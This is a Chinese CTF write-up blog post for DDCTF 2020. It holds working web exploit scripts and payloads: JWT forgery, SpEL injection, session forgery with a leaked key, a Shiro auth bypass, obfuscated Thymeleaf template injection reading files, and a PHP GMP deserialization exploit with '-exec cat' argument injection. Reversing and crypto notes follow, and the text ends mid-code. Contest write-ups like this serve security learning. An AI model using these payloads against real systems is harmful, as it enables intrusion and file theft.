@@ -1,0 +1,372 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>DDCTF 2020 Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233"><meta property="og:image" content><meta property="og:title" content="DDCTF 2020 Writeup"><meta property="og:description" content="今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/09/07/DDCTF-2020-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-07T21:48:48+00:00"><meta property="article:modified_time" content="2020-09-07T21:48:48+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DDCTF 2020 Writeup"><meta name=twitter:description content="今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233"><script src=https://rmb122.com/js/feather.min.js></script>
+<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
+<a href=/tags>标签</a>&nbsp;
+<a href=/posts>归档</a>&nbsp;
+<a href=/about>关于</a>&nbsp;
+<a href=/links>友链</a>
+| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
+<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>DDCTF 2020 Writeup</h1><div class=meta>发表于 2020 年 9 月 7 日</div></div><section class=body><p>今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233</p><h2 id=web>WEB</h2><h3 id=web签到题>Web签到题</h3><p>访问 http://117.51.136.197/hint/1.txt 得到使用说明，</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>curl http://117.51.136.197/admin/login -d &#39;username=1&amp;pwd=1&#39; -vv
+</span></span></code></pre></div><p>拿到 token</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{&#34;code&#34;:0,&#34;message&#34;:&#34;success&#34;,&#34;data&#34;:&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ2OTA0Mn0.fONrD0R3NLTybq2WEP5V7uWTBI_0T0E5utI3MZFngMU&#34;}
+</span></span></code></pre></div><p>明显的 jwt，需要用这个来 auth，用 <code>https://github.com/brendan-rius/c-jwt-cracker</code> 爆破出来 secret 是 1，修改 userRole 到 ADMIN 就可以拿到客户端的地址 http://117.51.136.197/B5Itb8dFDaSFWZZo/client</p><p>逆向一下得到用签名算法用的是 hmac，key 是 DDCTFWithYou，fuzz 了半天发现是 spel，直接命令执行似乎不行，于是根据提示给的 flag 位置直接读 flag 即可</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> time
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> hmac
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cmd <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;{&#39;a&#39;: T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(&#39;/home/dc2-user/flag/flag.txt&#39;))}&#34;</span>
+</span></span><span style=display:flex><span>ts <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(time<span style=color:#ff79c6>.</span>time())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sign <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b64encode(hmac<span style=color:#ff79c6>.</span>new(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;DDCTFWithYou&#39;</span>,msg<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>cmd<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>|</span><span style=color:#f1fa8c>{</span>ts<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>encode(), digestmod<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;sha256&#39;</span>)<span style=color:#ff79c6>.</span>digest())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;{&#34;signature&#34;:&#34;65+KmCKrBVr6UAsjvSZ/iu1bdpx5xmIJLmAX2Squksk=&#34;,&#34;command&#34;:&#34;&#39;ls&#39;&#34;,&#34;timestamp&#34;:1599189389}&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://117.51.136.197/server/command&#39;</span>, json<span style=color:#ff79c6>=</span>{
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;signature&#39;</span>: sign<span style=color:#ff79c6>.</span>decode(),
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;command&#39;</span>: cmd,
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;timestamp&#39;</span>: ts
+</span></span><span style=display:flex><span>})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
+</span></span></code></pre></div><h3 id=卡片商店>卡片商店</h3><p>看到 session 就知道明显的是 gin，于是尝试整数溢出，借 9223372036854775807 个卡片就可以成功溢出，只需要还 1 张卡片，白嫖 9223372036854775806 张，兑换得到提示</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: /flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？
+</span></span></code></pre></div><p>访问 flag 提示不是幸运玩家，但是有了 secretkey 就可以直接伪造 session，对 session base64 解码可以发现用的是 gob 序列化，明显看到 bool, admin 字样，直接自己也搭一个环境设置个 admin session 即可</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#ff79c6>package</span> main
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> (
+</span></span><span style=display:flex><span>	<span style=color:#f1fa8c>&#34;github.com/gin-contrib/sessions&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#f1fa8c>&#34;github.com/gin-contrib/sessions/cookie&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#f1fa8c>&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>func</span> <span style=color:#50fa7b>main</span>() {
+</span></span><span style=display:flex><span>	r <span style=color:#ff79c6>:=</span> gin.<span style=color:#50fa7b>Default</span>()
+</span></span><span style=display:flex><span>	store <span style=color:#ff79c6>:=</span> cookie.<span style=color:#50fa7b>NewStore</span>([]<span style=color:#8be9fd;font-style:italic>byte</span>(<span style=color:#f1fa8c>&#34;Udc13VD5adM_c10nPxFu@v12&#34;</span>))
+</span></span><span style=display:flex><span>	r.<span style=color:#50fa7b>Use</span>(sessions.<span style=color:#50fa7b>Sessions</span>(<span style=color:#f1fa8c>&#34;session&#34;</span>, store))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	r.<span style=color:#50fa7b>GET</span>(<span style=color:#f1fa8c>&#34;/hello&#34;</span>, <span style=color:#8be9fd;font-style:italic>func</span>(c <span style=color:#ff79c6>*</span>gin.Context) {
+</span></span><span style=display:flex><span>		session <span style=color:#ff79c6>:=</span> sessions.<span style=color:#50fa7b>Default</span>(c)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#ff79c6>if</span> session.<span style=color:#50fa7b>Get</span>(<span style=color:#f1fa8c>&#34;hello&#34;</span>) <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#34;world&#34;</span> {
+</span></span><span style=display:flex><span>			session.<span style=color:#50fa7b>Set</span>(<span style=color:#f1fa8c>&#34;admin&#34;</span>, <span style=color:#ff79c6>true</span>)
+</span></span><span style=display:flex><span>			session.<span style=color:#50fa7b>Save</span>()
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		c.<span style=color:#50fa7b>JSON</span>(<span style=color:#bd93f9>200</span>, gin.H{<span style=color:#f1fa8c>&#34;hello&#34;</span>: session.<span style=color:#50fa7b>Get</span>(<span style=color:#f1fa8c>&#34;hello&#34;</span>)})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>	r.<span style=color:#50fa7b>Run</span>(<span style=color:#f1fa8c>&#34;:8000&#34;</span>)
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=easy-web>Easy Web</h3><p>deleteMe 很明显的 shiro，但是尝试了下反序列化，key 全部不对。于是尝试了下新的权限绕过，可以直接越权访问到 index</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/index
+</span></span></code></pre></div><p>明显有个 img 接口可以任意文件下载，通过 WEB-INF/web.xml 一直套娃下，可以下到一堆 class，但是没有找到有漏洞的接口，在 GitHub 上找了下类似的项目，fuzz 了一堆配置文件，最后找到 <code>WEB-INF/classes/spring-shiro.xml</code>.
+里面有个 <code>WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class</code>，找到路由 <code>map.put("/68759c96217a32d5b368ad2965f625ef/**", "authc,roles[admin]");</code>, 进去发现是个 thymeleaf 渲染，但是要绕之前的 com.ctf.util.SafeFilter.</p><p>绕了半天最后用 ProcessBuiler 弹 shell 发现连 ls 都没权限执行，于是只好回到 java 用相关 API 读文件，构造 payload 用 File 来列目录，发现 flag 就在 /flag_is_here</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#6272a4># /flag_is_here</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>20</span>):
+</span></span><span style=display:flex><span>    sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
+</span></span><span style=display:flex><span>    content <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    [[${ T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101})).getConstructors()[1].newInstance(T(String).valueOf(new char[]</span><span style=color:#f1fa8c>{47}</span><span style=color:#f1fa8c>)).listFiles()[</span><span style=color:#f1fa8c>%d</span><span style=color:#f1fa8c>] }]]
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    &#39;&#39;&#39;</span><span style=color:#ff79c6>%</span> i
+</span></span><span style=display:flex><span>    res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#34;http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize&#34;</span>, {
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;content&#39;</span>: content
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>#[[${ (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114})).getConstructors()[0].newInstance(T(String).valueOf(new char[]{47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101})))).next() }]]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    uuid <span style=color:#ff79c6>=</span> res<span style=color:#ff79c6>.</span>text[res<span style=color:#ff79c6>.</span>text<span style=color:#ff79c6>.</span>find(<span style=color:#f1fa8c>&#39;./render/&#39;</span>)<span style=color:#ff79c6>+</span><span style=color:#8be9fd;font-style:italic>len</span>(<span style=color:#f1fa8c>&#39;./render/&#39;</span>):res<span style=color:#ff79c6>.</span>text<span style=color:#ff79c6>.</span>find(<span style=color:#f1fa8c>&#39;./render/&#39;</span>)<span style=color:#ff79c6>+</span><span style=color:#8be9fd;font-style:italic>len</span>(<span style=color:#f1fa8c>&#39;./render/2b32ce0c2a9292af4fdfe3333058c02c&#39;</span>)]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/render/</span><span style=color:#f1fa8c>{</span>uuid<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
+</span></span></code></pre></div><p>最后用 Scanner 这个类，方法名里面没有 read， payload 如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[[${ (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114})).getConstructors()[0].newInstance(T(String).valueOf(new char[]{47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101})))).next() }]]
+</span></span></code></pre></div><h3 id=overwrite-me>Overwrite Me</h3><p>GMP 的一个 CVE，百度就能搜到, 可以覆盖任意对象的任意属性. <a href="https://bugs.php.net/bug.php?id=70513">https://bugs.php.net/bug.php?id=70513</a>.
+访问 http://117.51.137.166/hint/hint.php 拿到前半部分
+然后覆盖 $mc 的 flag 导致参数注入就能读到后半部分</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$inj</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;-exec cat {} ;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$inner</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;s:1:&#34;3&#34;;a:3:{s:4:&#34;flag&#34;;s:&#39;</span><span style=color:#ff79c6>.</span>strlen(<span style=color:#8be9fd;font-style:italic>$inj</span>)<span style=color:#ff79c6>.</span><span style=color:#f1fa8c>&#39;:&#34;&#39;</span><span style=color:#ff79c6>.</span><span style=color:#8be9fd;font-style:italic>$inj</span><span style=color:#ff79c6>.</span><span style=color:#f1fa8c>&#39;&#34;;s:2:&#34;hi&#34;;s:2:&#34;aa&#34;;i:0;O:12:&#34;DateInterval&#34;:1:{s:1:&#34;y&#34;;R:2;}}&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$exploit</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;a:1:{i:0;C:3:&#34;GMP&#34;:&#39;</span><span style=color:#ff79c6>.</span>strlen(<span style=color:#8be9fd;font-style:italic>$inner</span>)<span style=color:#ff79c6>.</span><span style=color:#f1fa8c>&#39;:{&#39;</span><span style=color:#ff79c6>.</span><span style=color:#8be9fd;font-style:italic>$inner</span><span style=color:#ff79c6>.</span><span style=color:#f1fa8c>&#39;}}&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff79c6>echo</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$exploit</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff79c6>echo</span> <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$a</span> <span style=color:#ff79c6>=</span> urlencode(<span style=color:#8be9fd;font-style:italic>$exploit</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>system(<span style=color:#f1fa8c>&#34;curl http://117.51.137.166/EOf9uk3nSsVFK1LQ.php?bullet=</span><span style=color:#f1fa8c>$a</span><span style=color:#f1fa8c>&#34;</span>);
+</span></span></code></pre></div><h2 id=re>RE</h2><h3 id=android-reverse-1>Android Reverse 1</h3><p>一个有点不太对劲的AES和tea系列加密算法加一个md5。
+虽然aes不太对劲，但顺着aes加密函数，在他隔壁找到了aes的解密函数，直接把加密hook成解密就可以解密。
+arm64的so里的tea解密部分好像被优化了，所以先把apk重打包，扔掉64位的so。
+32位的so里的tea加密也是一个函数，有一个控制加密的参数8，hook掉把8改为-8，即可以解密。
+然后md5部分没办法解，顺着给的提示先解tea，再解AES，就可以拿到Flag。</p><h3 id=android-reverse-2>Android Reverse 2</h3><p>先github找个脚本，恢复了Armariris的字符串，然后顺着找到动态注册的关键函数。</p><p>包名如第一题，猜测算法也基本同第一题，hook了一下发现aes没变，tea加密变化了，可能是密钥之类的变了，不过没事还是可以直接Hook改参数。
+Frida-dexdump确认了一下，Java层啥都没有。</p><p>所以还是直接Hook加密改成解密就可以得到Flag。</p><h2 id=misc>MISC</h2><h3 id=真签到题>真·签到题</h3><p>公告板里面有</p><h3 id=一起拼图吗>一起拼图吗</h3><p>ChaMD5 之前有类似的题目，github 上有解题脚本 <a href=https://github.com/virink/puzzle_tool>https://github.com/virink/puzzle_tool</a>, 用模式 4 DiffRGB 就能直接拼回来</p><h3 id=decrypt>decrypt</h3><p>一共 5 个轮密钥，其中很明显因为只是异或 + 位移的关系， k3, k4 可以合并成一个，实际上有效的是 4 个 0-4096 的密钥，但是空间还是很大，没办法爆破。
+这里可以用 MITM，保存 4096 * 4096 个状态，将爆破空间降到 4096^3，用 cpp 写了下，速度还是挺快的，几分钟能跑完，
+选取给的 plaintext 和 ciphertext 的第一个 bits 来爆破，然后用后面的 3 个来验证下是否正确</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;iostream&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;vector&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;unordered_map&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>//int sbox0[] = 太长不复制了
+</span></span></span><span style=display:flex><span><span style=color:#6272a4>//int sbox1[] =
+</span></span></span><span style=display:flex><span><span style=color:#6272a4>//int rsbox0[] =
+</span></span></span><span style=display:flex><span><span style=color:#6272a4>//int rsbox1[] =
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> NUM_BITS <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>12</span>;
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> MAX_VALUE <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>2</span> <span style=color:#ff79c6>&lt;&lt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>));
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> BIT_MASK <span style=color:#ff79c6>=</span> MAX_VALUE <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>rol7</span>(<span style=color:#8be9fd>int</span> b) {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ((((b) <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>|</span> (((b) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>&gt;&gt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>7</span>)));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>ror7</span>(<span style=color:#8be9fd>int</span> b) {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ((((b) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>|</span> (((b) <span style=color:#ff79c6>&lt;&lt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>7</span>)) <span style=color:#ff79c6>&amp;</span> BIT_MASK));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>encrypt_block</span>(<span style=color:#8be9fd>int</span> i, <span style=color:#8be9fd>int</span> k0, <span style=color:#8be9fd>int</span> k1, <span style=color:#8be9fd>int</span> k2, <span style=color:#8be9fd>int</span> k3, <span style=color:#8be9fd>int</span> k4) {
+</span></span><span style=display:flex><span>    i <span style=color:#ff79c6>=</span> sbox0[sbox1[sbox0[(i <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>^</span> k0] <span style=color:#ff79c6>^</span> k1] <span style=color:#ff79c6>^</span> k2] <span style=color:#ff79c6>^</span> k3;
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (ror7(i) <span style=color:#ff79c6>^</span> k4) <span style=color:#ff79c6>&amp;</span> BIT_MASK;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>encrypt_block_simple</span>(<span style=color:#8be9fd>int</span> i, <span style=color:#8be9fd>int</span> k0, <span style=color:#8be9fd>int</span> k1, <span style=color:#8be9fd>int</span> k2, <span style=color:#8be9fd>int</span> kf) {
+</span></span><span style=display:flex><span>    i <span style=color:#ff79c6>=</span> sbox0[sbox1[sbox0[(i <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>^</span> k0] <span style=color:#ff79c6>^</span> k1] <span style=color:#ff79c6>^</span> k2];
+</span></span><span style=display:flex><span>    i <span style=color:#ff79c6>=</span> i <span style=color:#ff79c6>^</span> kf;
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (ror7(i)) <span style=color:#ff79c6>&amp;</span> BIT_MASK;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>decrypt_block</span>(<span style=color:#8be9fd>int</span> i, <span style=color:#8be9fd>int</span> k0, <span style=color:#8be9fd>int</span> k1, <span style=color:#8be9fd>int</span> k2, <span style=color:#8be9fd>int</span> k3, <span style=color:#8be9fd>int</span> k4) {
+</span></span><span style=display:flex><span>    i <span style=color:#ff79c6>=</span> rol7((i <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>^</span> k4) <span style=color:#ff79c6>^</span> k3;
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (rsbox0[rsbox1[rsbox0[i] <span style=color:#ff79c6>^</span> k2] <span style=color:#ff79c6>^</span> k1] <span style=color:#ff79c6>^</span> k0);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>decrypt_block_simple</span>(<span style=color:#8be9fd>int</span> i, <span style=color:#8be9fd>int</span> k0, <span style=color:#8be9fd>int</span> k1, <span style=color:#8be9fd>int</span> k2, <span style=color:#8be9fd>int</span> kf) {
+</span></span><span style=display:flex><span>    i <span style=color:#ff79c6>=</span> rol7((i <span style=color:#ff79c6>&amp;</span> BIT_MASK)) <span style=color:#ff79c6>^</span> kf;
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (rsbox0[rsbox1[rsbox0[i] <span style=color:#ff79c6>^</span> k2] <span style=color:#ff79c6>^</span> k1] <span style=color:#ff79c6>^</span> k0);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>merge_two</span>(<span style=color:#8be9fd>int</span> n1, <span style=color:#8be9fd>int</span> n2) {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (n1 <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#bd93f9>12</span>) <span style=color:#ff79c6>|</span> n2;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>std<span style=color:#ff79c6>::</span>pair<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>int</span>, <span style=color:#8be9fd>int</span><span style=color:#ff79c6>&gt;</span> split_two(<span style=color:#8be9fd>int</span> n) {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> std<span style=color:#ff79c6>::</span>make_pair(n <span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#bd93f9>12</span>, n <span style=color:#ff79c6>&amp;</span> BIT_MASK);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>// 1092 -&gt; 2285
+</span></span></span><span style=display:flex><span><span style=color:#6272a4>// k0, k1, k2, (k3 ^ k4) -&gt; kf
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>main</span>() {
+</span></span><span style=display:flex><span>    std<span style=color:#ff79c6>::</span>unordered_map<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>int</span>, std<span style=color:#ff79c6>::</span>vector<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>int</span><span style=color:#ff79c6>&gt;&gt;</span> mid_status;
+</span></span><span style=display:flex><span>    std<span style=color:#ff79c6>::</span>vector<span style=color:#ff79c6>&lt;</span>std<span style=color:#ff79c6>::</span>pair<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>int</span>, <span style=color:#8be9fd>int</span><span style=color:#ff79c6>&gt;&gt;</span> keys;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4096</span>; i<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>        std<span style=color:#ff79c6>::</span>vector<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>int</span><span style=color:#ff79c6>&gt;</span> tmp;
+</span></span><span style=display:flex><span>        tmp.reserve(<span style=color:#bd93f9>4096</span>);
+</span></span><span style=display:flex><span>        mid_status[i] <span style=color:#ff79c6>=</span> tmp;
